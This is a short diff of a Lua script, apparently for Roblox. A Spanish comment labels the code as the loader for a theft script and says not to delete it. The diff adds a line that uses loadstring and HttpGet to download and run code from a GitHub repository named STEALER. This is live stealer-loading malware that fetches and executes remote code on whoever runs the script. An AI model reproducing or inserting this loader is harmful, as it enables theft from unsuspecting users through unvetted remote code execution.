@@ -25,5 +25,6 @@ end)
 -- ==========================================
 -- CARGA DEL script de robo NO BORRES ESTO 
 -- ==========================================
-local rawUrl = "https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"
-loadstring(game:HttpGet(rawUrl))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
